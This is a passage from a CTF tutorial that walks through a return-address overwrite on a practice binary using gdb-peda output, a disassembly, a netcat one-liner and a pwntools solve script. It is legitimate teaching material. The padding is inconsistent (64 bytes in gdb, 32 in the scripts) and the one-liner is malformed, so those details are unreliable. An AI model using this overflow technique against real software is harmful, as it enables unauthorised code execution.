gdb-peda$ r <<< `python -c 'print "A" * 20'`
Starting program: /home/maritiren/pwn_intro3 <<< `python -c 'print "A" * 20'`
Professor maritio_o:
Does anyone remember the name of the spell we made last lecture?
[Inferior 1 (process 12852) exited normally]
Warning: not running or target is remote
```

However, we want it to segfault in order for us to get the padding for the 
return address. We try with more input:

```bash
gdb-peda$ r <<< `python -c 'print "A" * 100'`

```

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x40 ('@')
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd04c ('A' <repeats 64 times>, "\201>\337\367\001")
EDX: 0x40 ('@')
ESI: 0xf7fb3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd070 ('A' <repeats 28 times>, "\201>\337\367\001")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd070 ('A' <repeats 28 times>, "\201>\337\367\001")
0004| 0xffffd074 ('A' <repeats 24 times>, "\201>\337\367\001")
0008| 0xffffd078 ('A' <repeats 20 times>, "\201>\337\367\001")
0012| 0xffffd07c ('A' <repeats 16 times>, "\201>\337\367\001")
0016| 0xffffd080 ('A' <repeats 12 times>, "\201>\337\367\001")
0020| 0xffffd084 ("AAAAAAAA\201>\337\367\001")
0024| 0xffffd088 ("AAAA\201>\337\367\001")
0028| 0xffffd08c --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```

That looks more like it! Notice how the debugger prints the address that it
segfaulted on, right there on the bottom of the snippet. You should be looking
for the two lines `Stopped reason: SIGSEGV` and `0x41414141 in ?? ()`, where
the first tells us it stopped due to a segfault (SIGSEGV), and the last prints
the address making the program overflow. We overwrote the return address on the 
stack with A's, making
the program to try continuing to that address. But _0x41414141_ isn't a valid
memory address! It is just the hexadecimal representation of four A's!

A nice tip is to add four B's at the end of the A's. Then we know the exact 
amount of padding when gdb segfaults having _0x42424242_ as the memory 
address it tried to return to. Then we also know that we may replace the four
bytes for the B's with the four bytes of the replacement return address. 
By trying a little, we finally get the right padding. 

```bash
gdb-peda$ r <<< `python -c 'print "A" * 64 + "BBBB"'`
```

In which gdb outputs the following:

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x25 ('%')
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd05c ('A' <repeats 32 times>, "BBBB\nY\376\367\240\320\377\377")
EDX: 0x40 ('@')
ESI: 0xf7fb3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd080 --> 0xf7fe590a (and    al,0x2c)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 --> 0xf7fe590a (and    al,0x2c)
0004| 0xffffd084 --> 0xffffd0a0 --> 0x1 
0008| 0xffffd088 --> 0x0 
0012| 0xffffd08c --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd090 --> 0xf7fb3000 --> 0x1d7d6c 
0020| 0xffffd094 --> 0xf7fb3000 --> 0x1d7d6c 
0024| 0xffffd098 --> 0x0 
0028| 0xffffd09c --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

2. We are nearly there! We know exactly where to put the memory address we want
the program to continue from after finishing the `answer_professor` function 
code. The only thing we are missing is the memory address itself. This is the 
main reason we use gdb! As we know the function name by looking at the source 
code, finding the memory address is as easy as doing the following in gdb:

```bash
gdb-peda$ disas print_secret_message
Dump of assembler code for function print_secret_message:
   0x080484b6 <+0>:	push   ebp
   0x080484b7 <+1>:	mov    ebp,esp
   0x080484b9 <+3>:	push   ebx
   0x080484ba <+4>:	sub    esp,0x4
   0x080484bd <+7>:	call   0x8048575 <__x86.get_pc_thunk.ax>
   0x080484c2 <+12>:	add    eax,0x1442
   0x080484c7 <+17>:	sub    esp,0xc
   0x080484ca <+20>:	lea    edx,[eax-0x1304]
   0x080484d0 <+26>:	push   edx
   0x080484d1 <+27>:	mov    ebx,eax
   0x080484d3 <+29>:	call   0x8048360 <system@plt>
   0x080484d8 <+34>:	add    esp,0x10
   0x080484db <+37>:	nop
   0x080484dc <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080484df <+41>:	leave  
   0x080484e0 <+42>:	ret    
End of assembler dump.
gdb-peda$ 
```

We choose the memory address at the top of the function, and the program will
run all the code in the function, and print our precious secret! Another hot
tip is to make a file called _flag.txt_ on your computer when working locally.
If you don't, the program will get an error saying that the file it is trying
to read is missing. It is nice to put in a dummy flag, so that you know it 
works as wanted.

---

If it works locally on your machine, you should be ready for the exam! 
Unbelievable, isn't it? After the three exams for this course, you have 
the foundation to become a Master of Pwntions! The exam is the task 
named `Introduction to Pwntions: Stack overflow pt. 3` in the pwn 
category at the challenges page. As a tip for the exam, you should 
replace the binary file on your machine with the _netcat_ (nc) command,
using the given url and port as parameters. Then you insert the input 
to the server. Poke us on [Discord](https://discord.gg/da4rjQ) in the 
#tghack channel, or come by the TG:Hack area in the Creative zone during 
the lanparty [The Gathering](https://www.gathering.org/tg19) for help!

<details><summary>netcat and python solve script example</summary><p>

There are two common ways to send the solution to the remote server. One
of them is using a one line input as we have done in the previous stack 
overflow tutorial pages, as in the example below.

```bash
$ python -c 'print "A" * 32 + \xb6\x84\x04\x08' | nc url.tghack.no 1337
```
	
The other way is to build a Python script using pwntools. An example 
solution script is making the following script in the file 
`solve_script.py`:

```python
from pwn import *

 # True = local debugging 
 # False = sending input to remote server
debug = True

if debug == True:
    r = process("./pwn_intro3")
else:
    r = remote("url.tghack.no", 1337)

r.recvuntil("lecture?\n")

new_return_address = "\xb6\x84\x04\x08" #0x080484b6

r.sendline("A" * 32 + new_return_address)

r.interactive()
```

And you may run the script by writing `python solve_script.py`.

</p></details>

<br>

Go on, build the magical spell to run the unused function in the **pwntion3** task from the challenge page.
You must find the right value in your magical spell buffer, and fetch the flag! It is the 
third task of the exam. 
Good luck, future Master of Pwntions!
